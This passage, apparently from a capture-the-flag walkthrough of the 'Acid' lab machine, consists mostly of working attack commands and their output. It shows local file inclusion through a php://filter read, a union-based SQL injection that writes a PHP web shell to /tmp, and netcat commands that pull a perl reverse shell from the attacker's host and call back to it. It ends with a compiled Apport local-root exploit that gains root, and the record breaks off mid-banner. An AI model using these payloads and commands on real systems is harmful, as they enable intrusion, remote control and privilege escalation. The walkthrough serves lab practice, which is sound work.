</span><span class='line'>        &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;styles/main.css&quot;</span> /&gt;
</span><span class='line'>        &lt;title&gt;Secure Login: Protected Page&lt;/title&gt;
</span><span class='line'>    &lt;/head&gt;
</span><span class='line'>    &lt;body&gt;
</span><span class='line'>   &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&quot;wrapper&quot;</span>&gt;
</span><span class='line'>                &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&quot;container&quot;</span>&gt;
</span><span class='line'>              &lt;?php
</span><span class='line'>          <span class="nv">$host</span> <span class="o">=</span> getenv<span class="o">(</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>          <span class="nv">$ref</span> <span class="o">=</span> getenv<span class="o">(</span><span class="s2">&quot;HTTP_REFERER&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>          <span class="nv">$ref1</span> <span class="o">=</span> <span class="s2">&quot;http://&quot;</span>.<span class="s2">&quot;$host/Challenge/includes/process_login.php&quot;</span><span class="p">;</span>
</span><span class='line'>          ?&gt;
</span><span class='line'>
</span><span class='line'>          &lt;?php <span class="k">if</span> <span class="o">(</span>login_check<span class="o">(</span><span class="nv">$mysqli</span><span class="o">)</span> <span class="o">==</span> <span class="nb">true</span><span class="o">)</span>: ?&gt;
</span><span class='line'>
</span><span class='line'>          &lt;p&gt;&lt;h1&gt; You have been logged into admin Panel Successfully.&lt;/h1&gt; &lt;br&gt;
</span><span class='line'>          &lt;p&gt;&lt;h3&gt;You are close to your destination :-<span class="o">)</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;include.php&quot;</span>&gt;Click Here to Proceed Further&lt;/a&gt;.&lt;/h3&gt;&lt;/p&gt;
</span><span class='line'>              &lt;p&gt;&lt;h3&gt;If you are <span class="k">done</span>, please &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;includes/logout.php&quot;</span>&gt;log out&lt;/a&gt;.&lt;/h3&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>          &lt;?php elseif <span class="o">(</span><span class="nv">$ref</span> <span class="o">==</span> <span class="nv">$ref1</span><span class="o">)</span>: ?&gt;
</span><span class='line'>              &lt;p&gt; &lt;h1&gt;Congrats..! You have bypassed User Panel Successfully.&lt;/h1&gt; &lt;br&gt;
</span><span class='line'>              &lt;p&gt;&lt;h3&gt;There is long way to go :-<span class="o">)</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;hacked.php&quot;</span>&gt;Click Here to Proceed Further&lt;/a&gt;.&lt;/h3&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>              &lt;p&gt;&lt;h3&gt;If you are <span class="k">done</span>, please &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;includes/logout.php&quot;</span>&gt;log out&lt;/a&gt;.&lt;/h3&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>          &lt;?php <span class="k">else</span>: ?&gt;
</span><span class='line'>          &lt;p&gt;&lt;h1&gt;&lt;font <span class="nv">color</span><span class="o">=</span><span class="s1">&#39;Red&#39;</span>&gt;You are not authorized to access this page.&lt;/h1&gt;&lt;/font&gt;&lt;br&gt;&lt;font <span class="nv">color</span><span class="o">=</span><span class="s1">&#39;Green&#39;</span>&gt;Please &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;index.php&quot;</span>&gt;login&lt;/a&gt;&lt;/font&gt;&lt;/br&gt;.&lt;/p&gt;
</span><span class='line'>          &lt;?php endif<span class="p">;</span> ?&gt;
</span><span class='line'>    &lt;/body&gt;
</span><span class='line'>&lt;/html&gt;
</span></code></pre></td></tr></table></div></figure>


<p>A very interesting php script named <strong>hacked.php</strong> is found in the elseif statement, lets point our browser to it:</p>

<p><img class="center" src="http://andrewemil.github.io/images/2015/1/image 10.png"></p>

<p>Ok, lets examine its source code to see what is actually happening inside that scirpt:</p>

<figure class='code'><figcaption><span>hacked.php source code </span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -s --cookie <span class="s2">&quot;sec_session_id=64uk8pthsvr3939mm9joa5u254&quot;</span> http://192.168.2.102:33447/Challenge/include.php?file<span class="o">=</span><span class="k">$(</span>php -r <span class="s2">&quot;echo urlencode(&#39;php://filter/convert.base64-encode/resource=hacked.php&#39;);&quot;</span><span class="k">)</span> <span class="p">|</span> sed  <span class="s1">&#39;/&lt;html&gt;/,/*/d&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;&lt;&#39;</span> -f <span class="m">1</span> <span class="p">|</span> base64 --decode
</span><span class='line'>&lt;?php
</span><span class='line'>include_once <span class="s1">&#39;includes/db_connect.php&#39;</span><span class="p">;</span>
</span><span class='line'>include_once <span class="s1">&#39;includes/functions.php&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>sec_session_start<span class="o">()</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="o">(</span>!isset<span class="o">(</span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;protected_page&#39;</span><span class="o">])){</span>
</span><span class='line'>  header<span class="o">(</span><span class="s1">&#39;Location: protected_page.php&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>  <span class="nb">exit</span><span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'><span class="k">if</span> <span class="o">(</span>!isset<span class="o">(</span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;index_page&#39;</span><span class="o">])){</span>
</span><span class='line'>  header<span class="o">(</span><span class="s1">&#39;Location: protected_page.php&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>  <span class="nb">exit</span><span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>?&gt;
</span><span class='line'>&lt;!DOCTYPE html&gt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>  &lt;head&gt;
</span><span class='line'>      &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span>&gt;
</span><span class='line'>      &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;css/style.css&quot;</span>&gt;
</span><span class='line'>      &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;styles/main.css&quot;</span> /&gt;
</span><span class='line'>      &lt;title&gt;Try to Extract Juicy details&lt;/title&gt;
</span><span class='line'>  &lt;/head&gt;
</span><span class='line'>  &lt;body&gt;
</span><span class='line'>      &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&quot;wrapper&quot;</span>&gt;
</span><span class='line'>                  &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&quot;container&quot;</span>&gt;
</span><span class='line'>              &lt;?php
</span><span class='line'>              <span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">&#39;add&#39;</span><span class="o">]))</span>
</span><span class='line'>              <span class="o">{</span>
</span><span class='line'>              <span class="nv">$dbhost</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
</span><span class='line'>              <span class="nv">$dbuser</span> <span class="o">=</span> <span class="s1">&#39;root&#39;</span><span class="p">;</span>
</span><span class='line'>              <span class="nv">$dbpass</span> <span class="o">=</span> <span class="s1">&#39;mehak&#39;</span><span class="p">;</span>
</span><span class='line'>              <span class="nv">$conn</span> <span class="o">=</span> mysql_connect<span class="o">(</span><span class="nv">$dbhost</span>, <span class="nv">$dbuser</span>, <span class="nv">$dbpass</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>              <span class="k">if</span><span class="o">(</span>! <span class="nv">$conn</span> <span class="o">)</span>
</span><span class='line'>              <span class="o">{</span>
</span><span class='line'>                      die<span class="o">(</span><span class="s1">&#39;Could not connect: &#39;</span> . mysql_error<span class="o">())</span><span class="p">;</span>
</span><span class='line'>              <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>              <span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;id&#39;</span><span class="o">]</span><span class="p">;</span>
</span><span class='line'>              <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM members WHERE ID = ((&#39;$id&#39;))&quot;</span><span class="p">;</span>
</span><span class='line'>              mysql_select_db<span class="o">(</span><span class="s1">&#39;secure_login&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>              <span class="nv">$retval</span> <span class="o">=</span> mysql_query<span class="o">(</span> <span class="nv">$sql</span>, <span class="nv">$conn</span> <span class="o">)</span><span class="p">;</span>
</span><span class='line'>              <span class="k">if</span><span class="o">(</span>! <span class="nv">$retval</span> <span class="o">)</span>
</span><span class='line'>              <span class="o">{</span>
</span><span class='line'>                      die<span class="o">(</span><span class="s1">&#39;Could not enter data: &#39;</span> . mysql_error<span class="o">())</span><span class="p">;</span>
</span><span class='line'>              <span class="o">}</span>
</span><span class='line'>                  <span class="nb">echo</span> <span class="s2">&quot;You have entered ID successfully...Which is not a big deal :D\n&quot;</span><span class="p">;</span>
</span><span class='line'>              mysql_close<span class="o">(</span><span class="nv">$conn</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>              <span class="o">}</span>
</span><span class='line'>              ?&gt;
</span><span class='line'>                  &lt;p&gt; &lt;h1&gt;You are going Good...Show me your Ninja Skills.&lt;/h1&gt; &lt;br&gt;
</span><span class='line'>              &lt;form <span class="nv">method</span><span class="o">=</span><span class="s2">&quot;get&quot;</span> <span class="nv">action</span><span class="o">=</span><span class="s2">&quot;&lt;?php $_PHP_SELF ?&gt;&quot;</span>&gt;
</span><span class='line'>              Enter your ID:&lt;input <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;id&quot;</span> <span class="nv">placeholder</span><span class="o">=</span><span class="s2">&quot;id&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;id&quot;</span> <span class="nv">maxlength</span><span class="o">=</span><span class="s2">&quot;20&quot;</span>&gt;
</span><span class='line'>              &lt;input <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;add&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;add&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;Add ID&quot;</span>&gt;
</span><span class='line'>
</span><span class='line'>              &lt;/body&gt;
</span><span class='line'>              &lt;/html&gt;
</span></code></pre></td></tr></table></div></figure>


<p>So, after examining the source code of <em>hacked.php</em>, we can see that the mysql query takes the id parameter which is sent through HTTP POST data , and not the one sent through HTTP GET data, and just select a row that matches that id, then it just prints &ldquo;You are going Good&hellip;Show me your Ninja Skills&rdquo;.</p>

<h3>UNION based SQL Injection</h3>

<p>That mysql query is vulnerable to <strong>union based sql injection</strong> and we can use <strong>SELECT .. INTO OUTFILE</strong> to write simple php shell in the /tmp directory to get remote command execution on the target machine.</p>

<p>The UNION operator combines the result of the two sql queries and it requires that they have the same number of columns.</p>

<p>By reading the <a href="https://github.com/peredurabefrog/phpSecureLogin/blob/master/secure_login.sql">secure_login.sql</a> file in the github repo of the login script, we can see that there are 5 columns per record in the members table.</p>

<p>The final payload will look like the following:</p>

<figure class='code'><figcaption><span>SQL Injection Payload</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">id</span><span class="o">=</span><span class="s1">&#39;)) UNION SELECT &quot;&lt;?php system($_GET[&#39;</span>cmd<span class="s1">&#39;]); ?&gt;&quot;,2,3,4,5 INTO OUTFILE &#39;</span>/tmp/shell.php<span class="err">&#39;</span>-- -
</span></code></pre></td></tr></table></div></figure>


<p>Lets fire up cURL again:</p>

<figure class='code'><figcaption><span>creating php shell in</span><a href='http://andrewemil.github.io/tmp/shell.php'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>curl -s --cookie <span class="s2">&quot;sec_session_id=pdn8qkd0v8ukgpdpcip10n00b5&quot;</span> --data <span class="s2">&quot;id=&#39;)) UNION SELECT &#39;&lt;?php system(%24_GET[\&#39;cmd\&#39;]); ?&gt;&#39;,2,3,4,5 INTO OUTFILE &#39;/tmp/shell.php&#39;-- -&quot;</span> <span class="s2">&quot;http://192.168.2.102:33447/Challenge/hacked.php?id=1&amp;add=Add+ID&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>We can simply use the hackbar firefox add-on instead of cURL to execute that payload as well:</p>

<p><img class="center" src="http://andrewemil.github.io/images/2015/1/image 11.png"></p>

<h3>Remote Command Execution</h3>

<p>By including our shell.php using include.php, we can execute any command under the privileges of the www-data user:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -s --cookie <span class="s2">&quot;sec_session_id=64uk8pthsvr3939mm9joa5u254&quot;</span> <span class="s2">&quot;http://192.168.2.102:33447/Challenge/include.php?file=/tmp/shell.php&amp;cmd=$(php -r &quot;</span><span class="nb">echo </span>urlencode<span class="o">(</span><span class="s1">&#39;id ;uname -a;pwd;which nc;which wget;which perl;which python&#39;</span><span class="o">)</span><span class="p">;</span><span class="s2">&quot;)&quot;</span> <span class="p">|</span> sed  <span class="s1">&#39;/&lt;!DOCTYPE html&gt;/,/*/d&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'>Linux acid 3.19.0-15-generic <span class="c">#15-Ubuntu SMP Thu Apr 16 23:32:01 UTC 2015 i686 i686 i686 GNU/Linux</span>
</span><span class='line'>/var/www/html/Challenge
</span><span class='line'>/bin/nc
</span><span class='line'>/usr/bin/perl
</span><span class='line'>/usr/bin/python
</span><span class='line'>  2   3   4   5
</span></code></pre></td></tr></table></div></figure>


<p>Wonderful!</p>

<p><em>Note that wget isn&rsquo;t available in the target system.</em></p>

<p>It&rsquo;s the time for an interactive shell:</p>

<p>We will use <a href="http://pentestmonkey.net/tools/web-shells/perl-reverse-shell">perl-reverse-shell</a> provided by <a href="http://pentestmonkey.net">pentestmonkey.net</a> after modifying the ip address and port number in the perl script, and we will use <strong>netcat</strong> to transfer the shell because <strong>wget</strong> isn&rsquo;t available in the target system.</p>

<p>Basic modifications in the perl reverse shell:</p>

<figure class='code'><figcaption><span>Modification to the perl-reverse-shell</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># Where to send the reverse shell.  Change these.</span>
</span><span class='line'>my <span class="nv">$ip</span> <span class="o">=</span> <span class="s1">&#39;192.168.2.108&#39;</span><span class="p">;</span> <span class="c">#Our kali&#39;s ip address</span>
</span><span class='line'>my <span class="nv">$port</span> <span class="o">=</span> 4444<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>lets upload it to Acid server, on our local machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -nvlp <span class="m">7777</span> &lt; revshell.pl
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">7777</span> ...
</span></code></pre></td></tr></table></div></figure>


<p>And on another terminal:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -s --cookie <span class="s2">&quot;sec_session_id=64uk8pthsvr3939mm9joa5u254&quot;</span> <span class="s2">&quot;http://192.168.2.102:33447/Challenge/include.php?file=/tmp/shell.php&amp;cmd=$(php -r &quot;</span><span class="nb">echo </span>urlencode<span class="o">(</span><span class="s1">&#39;cd /tmp;nc 192.168.2.108 7777 &gt; revshell.pl&#39;</span><span class="o">)</span><span class="p">;</span><span class="s2">&quot;)&quot;</span> <span class="p">|</span> sed  <span class="s1">&#39;/&lt;!DOCTYPE html&gt;/,/*/d&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Ok, after transferring the shell and while listening on port 4444 on our local machine, we execute revshell.pl on the target system using the following command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -s --cookie <span class="s2">&quot;sec_session_id=64uk8pthsvr3939mm9joa5u254&quot;</span> <span class="s2">&quot;http://192.168.2.102:33447/Challenge/include.php?file=/tmp/shell.php&amp;cmd=$(php -r &quot;</span><span class="nb">echo </span>urlencode<span class="o">(</span><span class="s1">&#39;cd /tmp;perl revshell.pl&#39;</span><span class="o">)</span><span class="p">;</span><span class="s2">&quot;)&quot;</span> <span class="p">|</span> sed  <span class="s1">&#39;/&lt;!DOCTYPE html&gt;/,/*/d&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And we successfully receive our reverse shell:</p>

<figure class='code'><figcaption><span>RCE</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -nvlp 4444
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
</span><span class='line'>connect to <span class="o">[</span>192.168.2.108<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.2.102<span class="o">]</span> 39553
</span><span class='line'> 23:13:11 up  1:33,  <span class="m">0</span> users,  load average: 0.00, 0.01, 0.05
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>Linux acid 3.19.0-15-generic <span class="c">#15-Ubuntu SMP Thu Apr 16 23:32:01 UTC 2015 i686 i686 i686 GNU/Linux</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'>/
</span><span class='line'>/usr/sbin/apache: 0: can<span class="s1">&#39;t access tty; job control turned off</span>
</span><span class='line'><span class="s1">$ python -c &#39;</span>import pty<span class="p">;</span>pty.spawn<span class="o">(</span><span class="s2">&quot;/bin/bash&quot;</span><span class="o">)</span><span class="err">&#39;</span>
</span><span class='line'>www-data@acid:/<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<h3>Privilege Escalation and Capturing the Flag</h3>

<p>Lets get the OS version information:</p>

<figure class='code'><figcaption><span>OS Info</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>www-data@acid:/<span class="nv">$ </span>uname -a
</span><span class='line'>uname -a
</span><span class='line'>Linux acid 3.19.0-15-generic <span class="c">#15-Ubuntu SMP Thu Apr 16 23:32:01 UTC 2015 i686 i686 i686 GNU/Linux</span>
</span><span class='line'>www-data@acid:/<span class="nv">$ </span>cat /etc/os-release
</span><span class='line'>cat /etc/os-release
</span><span class='line'><span class="nv">NAME</span><span class="o">=</span><span class="s2">&quot;Ubuntu&quot;</span>
</span><span class='line'><span class="nv">VERSION</span><span class="o">=</span><span class="s2">&quot;15.04 (Vivid Vervet)&quot;</span>
</span><span class='line'><span class="nv">ID</span><span class="o">=</span>ubuntu
</span><span class='line'><span class="nv">ID_LIKE</span><span class="o">=</span>debian
</span><span class='line'><span class="nv">PRETTY_NAME</span><span class="o">=</span><span class="s2">&quot;Ubuntu 15.04&quot;</span>
</span><span class='line'><span class="nv">VERSION_ID</span><span class="o">=</span><span class="s2">&quot;15.04&quot;</span>
</span><span class='line'><span class="nv">HOME_URL</span><span class="o">=</span><span class="s2">&quot;http://www.ubuntu.com/&quot;</span>
</span><span class='line'><span class="nv">SUPPORT_URL</span><span class="o">=</span><span class="s2">&quot;http://help.ubuntu.com/&quot;</span>
</span><span class='line'><span class="nv">BUG_REPORT_URL</span><span class="o">=</span><span class="s2">&quot;http://bugs.launchpad.net/ubuntu/&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Acid server is running under Ubuntu version 15.04 which is affected with a local root race condition vulnerability <em>&ldquo;CVE-2015-1325&rdquo;</em>.
There is a public exploit for this vulnerability: &ldquo;<a href="https://www.exploit-db.com/exploits/37088/">Apport/Ubuntu - Local Root Race Condition</a>&rdquo; which we will use to gain root privileges on Acid server.</p>

<p>Lets compile and transfer the exploit to the target system.</p>

<p>On our local machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# gcc 37088.c -o apport
</span><span class='line'>root@kali:~# nc -nvlp <span class="m">7777</span> &lt; apport
</span></code></pre></td></tr></table></div></figure>


<p>And on Acid server:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>www-data@acid:/<span class="nv">$ </span><span class="nb">cd</span> /tmp
</span><span class='line'><span class="nb">cd</span> /tmp
</span><span class='line'>www-data@acid:/tmp<span class="nv">$ </span>nc -nv 192.168.2.108 <span class="m">7777</span> &gt; apport
</span><span class='line'>nc -nv 192.168.2.108 <span class="m">7777</span> &gt; apport
</span><span class='line'>Connection to 192.168.2.108 <span class="m">7777</span> port <span class="o">[</span>tcp/*<span class="o">]</span> succeeded!
</span></code></pre></td></tr></table></div></figure>


<p>Then:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>www-data@acid:/tmp<span class="nv">$ </span>chmod +x apport
</span><span class='line'>chmod +x apport
</span></code></pre></td></tr></table></div></figure>


<p>And finally we execute the exploit and escalate our privileges to root:</p>

<p><em>Note: The exploit just hangs on the first attempt, but it has been executed successfully on the second one.</em></p>

<figure class='code'><figcaption><span>root access and capturing the flag</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>www-data@acid:/tmp<span class="nv">$ </span>./apport
</span><span class='line'>./apport
</span><span class='line'>created /var/crash/_bin_sleep.33.crash
</span><span class='line'>crasher: my pid is 1831
</span><span class='line'>apport stopped, <span class="nv">pid</span> <span class="o">=</span> 1832
</span><span class='line'>getting pid 1831
</span><span class='line'>current <span class="nv">pid</span> <span class="o">=</span> 1830..2500..5000..7500..10000..12500..15000..17500..20000..22500..25000..27500..30000..32500..
</span><span class='line'>** child: current <span class="nv">pid</span> <span class="o">=</span> 1831
</span><span class='line'>** child: executing /bin/su
</span><span class='line'>Password: sleeping 2s..
</span><span class='line'>
</span><span class='line'>checker: mode 4534
</span><span class='line'>waiting <span class="k">for</span> file to be unlinked..writing to fifo
</span><span class='line'>fifo written.. wait...
</span><span class='line'>waiting <span class="k">for</span> /etc/sudoers.d/core to appear..
</span><span class='line'>success
</span><span class='line'><span class="c"># id</span>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span><span class='line'><span class="c"># python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
</span><span class='line'>python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
</span><span class='line'>  ____                            _         _       _   _
</span><span class='line'> / ___<span class="p">|</span>___  _ __   __ _ _ __ __ _<span class="p">|</span> <span class="p">|</span>_ _   _<span class="p">|</span> <span class="p">|</span> __ _<span class="p">|</span> <span class="p">|</span>_<span class="o">(</span>_<span class="o">)</span> ___  _ __  ___
